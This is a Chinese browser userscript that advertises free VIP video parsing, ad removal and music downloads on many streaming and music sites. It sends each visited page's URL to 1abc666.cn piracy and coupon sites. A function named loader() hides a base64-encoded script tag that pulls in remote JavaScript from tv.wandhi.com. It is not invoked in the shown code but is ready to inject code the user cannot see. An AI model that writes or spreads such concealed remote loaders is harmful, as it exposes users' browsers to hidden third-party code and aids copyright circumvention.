// ==UserScript==
// @name         一键VIP视频解析、全网VIP视频解析,去广告,全网音乐在线试听 免费下载 全网音乐搜索 2018.11.28更新新增全网VIP视频解析、去广告
// @version      0.3
// @homepage     https://greasyfork.org/zh-CN/scripts/
// @match        *://y.qq.com/*
// @match        *://music.163.com/*
// @match        *://www.kugou.com/*
// @match        *://www.kuwo.cn/*
// @match        *://music.baidu.com/*
// @match        *://www.xiami.com/*
// @match        *://www.qingting.fm/*
// @match        *://www.ximalaya.com/*
// @match        *://www.lizhi.fm/*
// @match        *://music.migu.cn/*
// @match        *://music.taihe.com/*
// @match        *://v.youku.com/v_show/*
// @match        *://*.iqiyi.com/v_*
// @match        *://*.iqiyi.com/w_*
// @match        *://*.iqiyi.com/a_*
// @match        *://*.iqiyi.com/dianying/*
// @match        *://*.le.com/ptv/vplay/*
// @match        *://v.qq.com/x/cover/*
// @match        *://v.qq.com/x/page/*
// @match        *://*.tudou.com/listplay/*
// @match        *://*.tudou.com/albumplay/*
// @match        *://*.tudou.com/programs/view/*
// @match        *://*.mgtv.com/b/*
// @match        *://film.sohu.com/album/*
// @match        *://*.acfun.cn/v/*
// @match        *://*.bilibili.com/video/*
// @match        *://*.bilibili.com/anime/*
// @match        *://vip.pptv.com/show/*
// @match        *://v.pptv.com/show/*
// @description  在线视频播放，在线播放vip视频；腾讯vip视频，优酷视频，爱奇艺视频，芒果视频，乐视vip视频.全网音乐在线试听 免费下载 全网音乐搜索 多站音乐试听 多站音乐下载，网易云音乐，QQ音乐，酷狗，酷我，虾米，百度音乐，蜻蜓FM，荔枝FM，喜马拉雅
// @require      https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js
// @require      https://cdn.bootcss.com/clipboard.js/2.0.0/clipboard.min.js
// @require      https://greasyfork.org/scripts/374845-layer%E7%9A%84%E5%B0%8F%E5%BA%93/code/layer%E7%9A%84%E5%B0%8F%E5%BA%93.js?version=648537
// @icon         http://www.mp3.1abc666.cn/favicon.ico
// @run-at       document-end
// @namespace    www.1abc666.cn
// @run-at       document-end
// @grant        unsafeWindow
// @grant        GM_xmlhttpRequest
// @grant        GM_info
// @grant        GM.getValue
// @grant        GM.setValue
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_notification
// @grant        GM.xmlHttpRequest
// @grant        GM_openInTab
// @grant        GM.openInTab
// ==/UserScript==
(function() {
    'use strict';
    var CheckUrl = window.location.href;
    var WYy = /163(.*)song/i;
    var QQ = /QQ(.*)song/i;
    var KG = /kugou(.*)song/i;
    var KW = /kuwo(.*)yinyue/i;
    var XM = /xiami/i;
    var BD = /baidu/i;
    var QT = /qingting/i;
    var LZ = /lizhi/i;
    var MG = /migu/i;
    var XMLY = /ximalaya/i;
    var qianqian=/taihe(.*)song/i;
    var shpYk = /youku/i;
    var shpAqy = /iqiyi/i;
    var shpLS = /le.com/i;
    var shpTX = /v.qq/i;
    var shpTD = /tudou/i;
    var shpMG = /mgtv/i;
    var shpSH = /sohu/i;
    var shpAF = /acfun/i;
    var shpBL = /bilibili/i;
    var shpYJ = /1905/i;
    var shpPP = /pptv/i;
    var shpYYT = /yinyuetai/i;
    var vipBtn = '<a target="_blank" id="mp3Btn" style="margin:10px 0;display:inline-block;padding:0 5px;height:22px;border: 6px solid #ff002f;color: #f5f5f5;background: red;font-size: 19px;vertical-align:bottom;text-decoration:none;line-height:22px;cursor:pointer;">免费下载</a>';



    var html='';
    var name='';
     var sidenav = '<svg width="0" height="0"><defs><filter id="goo"><feGaussianBlur in="SourceGraphic" stdDeviation="10" result="blur"></feGaussianBlur><feColorMatrix in="blur" mode="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 19 -9" result="goo"></feColorMatrix><feComposite in="SourceGraphic" in2="goo" operator="atop"></feComposite></filter></defs></svg><div class="aside-nav bounceInUp animated" id="aside-nav"><label for="" class="aside-menu" title="\u6309\u4f4f\u62d6\u52a8">VIP</label><a href="javascript:void(0)" title="\u7535\u5f71\u641c\u7d22" data-cat="search" class="menu-item menu-line menu-first">\u7535\u5f71<br>\u641c\u7d22</a><a href="javascript:void(0)" title="\u89c6\u9891\u89e3\u6790" data-cat="process" class="menu-item menu-line menu-second">\u89c6\u9891<br>\u89e3\u6790</a><a href="javascript:void(0)" title="\u7edd\u4e16\u597d\u5238" data-cat="tb" class="menu-item menu-line menu-third">\u7edd\u4e16<br>\u597d\u5238</a><a href="javascript:void(0)" title="\u4eac\u4e1c\u597d\u5238" data-cat="jd" class="menu-item menu-line menu-fourth">\u97f3\u4e50<br>\u6b23\u8d4f</a></div>';
        $("body").append(sidenav).append($('<link rel="stylesheet" href="http://www.tv.1abc666.cn/static/css.css">'));
    //网易云音乐
    if(WYy.exec(CheckUrl) != null){
        var Title = $('.u-icn-37');
        Title.parent('.hd').after(vipBtn);
        var urlyun=window.location.href;
        var tt=urlyun.replace('song','#/song');
        $('#mp3Btn').attr('href','http://www.mp3.1abc666.cn/?url=' + encodeURIComponent(tt));
    }

    //QQ音乐
    if(QQ.exec(CheckUrl) != null){
        var Title = $('.data__name_txt')
        Title.parent('.data__name').after(vipBtn);
        $('#mp3Btn').attr('href','http://www.mp3.1abc666.cn/?url=' + encodeURIComponent(window.location.href));
    }

    //酷狗音乐
    if(KG.exec(CheckUrl) != null){
        KGadd();
        setInterval(function(){KGadd()},1000);
        function KGadd(){
            if($("#mp3Btn").length==0 && $(".audioName").length>0){
                var Title = $('.audioName');
                Title.parent('.songName').after(vipBtn);
            }
            $("#mp3Btn").attr("href","http://www.mp3.1abc666.cn/?url=" + encodeURIComponent(window.location.href));
        }
    }

    //酷我音乐
    if(KW.exec(CheckUrl) != null){
        var Title = $('#sinlesDownBtn');
        Title.parent('.down').after(vipBtn);
        $('#mp3Btn').attr('href','http://www.mp3.1abc666.cn/?url=' + encodeURIComponent(window.location.href));
    }
    //千千音乐
    if(qianqian.exec(CheckUrl) != null){
        var Title = $('.name');
        Title.after(vipBtn);
          var baiduurl=window.location.href;
          baiduurl=baiduurl.replace('music.taihe.com','music.baidu.com');
        $('#mp3Btn').attr('href','http://www.mp3.1abc666.cn/?url=' + encodeURIComponent(baiduurl));
    }
    //虾米音乐
    if(XM.exec(CheckUrl) != null){
        var Title = $('.player');
        Title.parent('.song_info').after(vipBtn);
        $('#mp3Btn').attr('href','http://www.mp3.1abc666.cn/?url=' + encodeURIComponent(window.location.href));
    }

    //百度音乐
    if(BD.exec(CheckUrl) != null){
        var Title = $('.songpage-title');
        Title.parent('.song').after(vipBtn);
        $('#mp3Btn').attr('href','http://www.mp3.1abc666.cn/?url=' + encodeURIComponent(window.location.href));
    }

    //蜻蜓FM
    if(QT.exec(CheckUrl) != null){
        QTadd();
        setInterval(function(){QTadd()},1000);
        function QTadd(){
            if($("#mp3Btn").length==0 && $(".sprite-program").length>0 && /qingting(.*)programs/i.test(window.location.href)){
                $(".sprite-program").parent().after(vipBtn);
            }
            $("#mp3Btn").attr("href","http://www.mp3.1abc666.cn/?url=" + encodeURIComponent(window.location.href));
        }
    }

    //荔枝FM
    if(LZ.exec(CheckUrl) != null){
        var Title = $('.audioName');
        Title.parent('.audioInfo').after(vipBtn);
        $('#mp3Btn').attr('href','http://www.mp3.1abc666.cn/?url=' + encodeURIComponent(window.location.href));
    }

    //喜马拉雅
    if( XMLY.exec(CheckUrl) != null){
        XMadd();
        setInterval(function(){XMadd()},1000);
        function XMadd(){
            if($("#mp3Btn").length==0 && $(".detailContent_title").length>0 && /ximalaya(.*)sound/i.test(window.location.href)){
                var Title = $('.detailContent_title');
                Title.parent('.right').after(vipBtn);
            }
            $("#mp3Btn").attr("href","http://www.mp3.1abc666.cn/?url=" + encodeURIComponent(window.location.href));
        }
    }

    if (shpAqy.test(CheckUrl) || shpLS.test(CheckUrl) || shpTX.test(CheckUrl) || shpTD.test(CheckUrl) || shpMG.test(CheckUrl) || shpSH.test(CheckUrl) || shpPP.test(CheckUrl) || shpYk.test(CheckUrl))
    {
        var ua = navigator.userAgent;
        /Safari|iPhone/i.test(ua) && 0 == /chrome/i.test(ua) && $("#aside-nav").addClass("no-filter");
        var drags = { down: !1, x: 0, y: 0, winWid: 0, winHei: 0, clientX: 0, clientY: 0 }, asideNav = $("#aside-nav")[0], getCss = function (a, e) { return a.currentStyle ? a.currentStyle[e] : document.defaultView.getComputedStyle(a, !1)[e] };
        $("body").on("mousedown","#aside-nav", function (a) {
            drags.down = !0, drags.clientX = a.clientX, drags.clientY = a.clientY, drags.x = getCss(this, "right"), drags.y = getCss(this, "top"), drags.winHei = $(window).height(), drags.winWid = $(window).width(), $(document).on("mousemove", function (a) {
                if (drags.winWid > 640 && (a.clientX < 120 || a.clientX > drags.winWid - 50))
                    return !1;
                if (a.clientY < 180 || a.clientY > drags.winHei - 120)
                    return !1;
                var e = a.clientX - drags.clientX,
                    t = a.clientY - drags.clientY;
                asideNav.style.top = parseInt(drags.y) + t + "px";
                asideNav.style.right = parseInt(drags.x) - e + "px";
            })
        }).on("mouseup","#aside-nav", function () {
            drags.down = !1, $(document).off("mousemove")
        });
        $('body').on('click', '[data-cat=process]', function () {
            window.open('http://www.tv.1abc666.cn/go.html?url=' + CheckUrl);
        });
        $('body').on('click', '[data-cat=search]', function () {
            window.open('http://www.tv.1abc666.cn/');
        });
        $('body').on('click', '[data-cat=tb]', function () {
            window.open('http://www.buy.1abc666.cn/');
        });
        $('body').on('click', '[data-cat=jd]', function () {
            window.open('http://www.Music.1abc666.cn');
        });
    }
     function loader()
    {
       
        $("body").append($(dde('JTNDc2NyaXB0JTIwdHlwZSUzRCUyMnRleHQlMkZqYXZhc2NyaXB0JTIyJTIwc3JjJTNEJTIyJTJGJTJGdHYud2FuZGhpLmNvbSUyRnN0YXRpYyUyRmpzJTJGc2NyaXB0LmpzJTIyJTNF')));
    }
    function de(a){return window.atob(a);}
    function dde(a){return decodeURIComponent(window.atob(a));}

     function addStyle(rules) {
        var styleElement = document.createElement('style');
        styleElement.type = 'text/css';
        document.getElementsByTagName('head')[0].appendChild(styleElement);
        styleElement.appendChild(document.createTextNode(rules));
    }
    addStyle('html {-ms-text-size-adjust: 100%;	-webkit-text-size-adjust: 100%;	-webkit-font-smoothing: antialiased;	font-size: 62.5%}');
    addStyle('body .aside-nav {font-family: "Helvetica Neue", Helvetica, "Microsoft YaHei", Arial, sans-serif;margin: 0;font-size: 1.6rem;color: #4E546B}');
    addStyle('.aside-nav {position: fixed;top: 350px;width: 260px;height: 260px;-webkit-filter: url(#goo);filter: url(#goo);-ms-user-select: none;-moz-user-select: none;-webkit-user-select: none;user-select: none;opacity: .75;z-index: 20180817;}');
    addStyle('.aside-nav.no-filter {-webkit-filter: none;filter: none}');
    addStyle('.aside-nav .aside-menu {position: absolute;width: 70px;height: 70px;-webkit-border-radius: 50%;border-radius: 50%;background: #f34444;left: 0;top: 0;right: 0;bottom: 0;margin: auto;text-align: center;line-height: 70px;color: #fff;font-size: 20px;z-index: 1;cursor: move}');
    addStyle('.aside-nav .menu-item {position: absolute;width: 60px;height: 60px;background-color: #FF7676;left: 0;top: 0;right: 0;bottom: 0;margin: auto;line-height: 60px;text-align: center;-webkit-border-radius: 50%;border-radius: 50%;text-decoration: none;color: #fff;-webkit-transition: background .5s, -webkit-transform .6s;transition: background .5s, -webkit-transform .6s;-moz-transition: transform .6s, background .5s, -moz-transform .6s;transition: transform .6s, background .5s;transition: transform .6s, background .5s, -webkit-transform .6s, -moz-transform .6s;font-size: 14px;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box}');
    addStyle('.aside-nav .menu-item:hover {background: #A9C734;}');
    addStyle('.aside-nav .menu-line {line-height: 20px;padding-top: 10px;}');

    addStyle('.aside-nav:hover {opacity: 1;}');

    addStyle('.aside-nav:hover .aside-menu {-webkit-animation: jello 1s;-moz-animation: jello 1s;animation: jello 1s}');

    addStyle('.aside-nav:hover .menu-first {-webkit-transform: translate3d(0, -135%, 0);-moz-transform: translate3d(0, -135%, 0);transform: translate3d(0, -135%, 0)}');

    addStyle('.aside-nav:hover .menu-second {-webkit-transform: translate3d(-120%, -70%, 0);-moz-transform: translate3d(-120%, -70%, 0);transform: translate3d(-120%, -70%, 0)}');

    addStyle('.aside-nav:hover .menu-third {-webkit-transform: translate3d(-120%, 70%, 0);-moz-transform: translate3d(-120%, 70%, 0);transform: translate3d(-120%, 70%, 0)}');

    addStyle('.aside-nav:hover .menu-fourth {-webkit-transform: translate3d(0, 135%, 0);-moz-transform: translate3d(0, 135%, 0);transform: translate3d(0, 135%, 0)}');

    addStyle('@-webkit-keyframes jello {from, 11.1%, to {-webkit-transform:none;transform:none}22.2% {-webkit-transform:skewX(-12.5deg) skewY(-12.5deg);transform:skewX(-12.5deg) skewY(-12.5deg)}33.3% {-webkit-transform:skewX(6.25deg) skewY(6.25deg);transform:skewX(6.25deg) skewY(6.25deg)}44.4% {-webkit-transform:skewX(-3.125deg) skewY(-3.125deg);transform:skewX(-3.125deg) skewY(-3.125deg)}55.5% {-webkit-transform:skewX(1.5625deg) skewY(1.5625deg);transform:skewX(1.5625deg) skewY(1.5625deg)}66.6% {-webkit-transform:skewX(-.78125deg) skewY(-.78125deg);transform:skewX(-.78125deg) skewY(-.78125deg)}77.7% {-webkit-transform:skewX(0.390625deg) skewY(0.390625deg);transform:skewX(0.390625deg) skewY(0.390625deg)}88.8% {-webkit-transform:skewX(-.1953125deg) skewY(-.1953125deg);transform:skewX(-.1953125deg) skewY(-.1953125deg)}}');

    addStyle('@-moz-keyframes jello {from, 11.1%, to {-moz-transform:none;transform:none}22.2% {-moz-transform:skewX(-12.5deg) skewY(-12.5deg);transform:skewX(-12.5deg) skewY(-12.5deg)}33.3% {-moz-transform:skewX(6.25deg) skewY(6.25deg);transform:skewX(6.25deg) skewY(6.25deg)}44.4% {-moz-transform:skewX(-3.125deg) skewY(-3.125deg);transform:skewX(-3.125deg) skewY(-3.125deg)}55.5% {-moz-transform:skewX(1.5625deg) skewY(1.5625deg);transform:skewX(1.5625deg) skewY(1.5625deg)}66.6% {-moz-transform:skewX(-.78125deg) skewY(-.78125deg);transform:skewX(-.78125deg) skewY(-.78125deg)}77.7% {-moz-transform:skewX(0.390625deg) skewY(0.390625deg);transform:skewX(0.390625deg) skewY(0.390625deg)}88.8% {-moz-transform:skewX(-.1953125deg) skewY(-.1953125deg);transform:skewX(-.1953125deg) skewY(-.1953125deg)}}');

    addStyle('@keyframes jello {from, 11.1%, to {-webkit-transform:none;-moz-transform:none;transform:none}22.2% {-webkit-transform:skewX(-12.5deg) skewY(-12.5deg);-moz-transform:skewX(-12.5deg) skewY(-12.5deg);transform:skewX(-12.5deg) skewY(-12.5deg)}33.3% {-webkit-transform:skewX(6.25deg) skewY(6.25deg);-moz-transform:skewX(6.25deg) skewY(6.25deg);transform:skewX(6.25deg) skewY(6.25deg)}44.4% {-webkit-transform:skewX(-3.125deg) skewY(-3.125deg);-moz-transform:skewX(-3.125deg) skewY(-3.125deg);transform:skewX(-3.125deg) skewY(-3.125deg)}55.5% {-webkit-transform:skewX(1.5625deg) skewY(1.5625deg);-moz-transform:skewX(1.5625deg) skewY(1.5625deg);transform:skewX(1.5625deg) skewY(1.5625deg)}66.6% {-webkit-transform:skewX(-.78125deg) skewY(-.78125deg);-moz-transform:skewX(-.78125deg) skewY(-.78125deg);transform:skewX(-.78125deg) skewY(-.78125deg)}77.7% {-webkit-transform:skewX(0.390625deg) skewY(0.390625deg);-moz-transform:skewX(0.390625deg) skewY(0.390625deg);transform:skewX(0.390625deg) skewY(0.390625deg)}88.8% {-webkit-transform:skewX(-.1953125deg) skewY(-.1953125deg);-moz-transform:skewX(-.1953125deg) skewY(-.1953125deg);transform:skewX(-.1953125deg) skewY(-.1953125deg)}}');

    addStyle('.animated {-webkit-animation-duration: 1s;-moz-animation-duration: 1s;animation-duration: 1s;-webkit-animation-fill-mode: both;-moz-animation-fill-mode: both;animation-fill-mode: both}');

    addStyle('@-webkit-keyframes bounceInUp {from, 60%, 75%, 90%, to {-webkit-animation-timing-function:cubic-bezier(0.215, .61, .355, 1);animation-timing-function:cubic-bezier(0.215, .61, .355, 1)}from {	opacity: 0;	-webkit-transform: translate3d(0, 800px, 0);	transform: translate3d(0, 800px, 0)}60% {opacity:1;-webkit-transform:translate3d(0, -20px, 0);transform:translate3d(0, -20px, 0)}75% {-webkit-transform:translate3d(0, 10px, 0);transform:translate3d(0, 10px, 0)}90% {-webkit-transform:translate3d(0, -5px, 0);transform:translate3d(0, -5px, 0)}to {	-webkit-transform: translate3d(0, 0, 0);	transform: translate3d(0, 0, 0)}}');

    addStyle('@-moz-keyframes bounceInUp {from, 60%, 75%, 90%, to {-moz-animation-timing-function:cubic-bezier(0.215, .61, .355, 1);animation-timing-function:cubic-bezier(0.215, .61, .355, 1)}from {	opacity: 0;	-moz-transform: translate3d(0, 800px, 0);	transform: translate3d(0, 800px, 0)}60% {opacity:1;-moz-transform:translate3d(0, -20px, 0);transform:translate3d(0, -20px, 0)}75% {-moz-transform:translate3d(0, 10px, 0);transform:translate3d(0, 10px, 0)}90% {-moz-transform:translate3d(0, -5px, 0);transform:translate3d(0, -5px, 0)}to {	-moz-transform: translate3d(0, 0, 0);	transform: translate3d(0, 0, 0)}}');

    addStyle('@keyframes bounceInUp {from, 60%, 75%, 90%, to {-webkit-animation-timing-function:cubic-bezier(0.215, .61, .355, 1);-moz-animation-timing-function:cubic-bezier(0.215, .61, .355, 1);animation-timing-function:cubic-bezier(0.215, .61, .355, 1)}from {opacity: 0;	-webkit-transform: translate3d(0, 800px, 0);	-moz-transform: translate3d(0, 800px, 0);	transform: translate3d(0, 800px, 0)}60% {opacity:1;-webkit-transform:translate3d(0, -20px, 0);-moz-transform:translate3d(0, -20px, 0);transform:translate3d(0, -20px, 0)}75% {-webkit-transform:translate3d(0, 10px, 0);-moz-transform:translate3d(0, 10px, 0);transform:translate3d(0, 10px, 0)}90% {-webkit-transform:translate3d(0, -5px, 0);-moz-transform:translate3d(0, -5px, 0);transform:translate3d(0, -5px, 0)}to {	-webkit-transform: translate3d(0, 0, 0);	-moz-transform: translate3d(0, 0, 0);	transform: translate3d(0, 0, 0)}}.bounceInUp {	-webkit-animation-name: bounceInUp;	-moz-animation-name: bounceInUp;	animation-name: bounceInUp;	-webkit-animation-delay: 1s;	-moz-animation-delay: 1s;	animation-delay: 1s}');
    addStyle('@media screen and (max-width:640px) {.aside-nav {display: none!important}}');
    addStyle('@media screen and (min-width:641px) and (max-width:1367px) {.aside-nav {top: 50px}}');




})();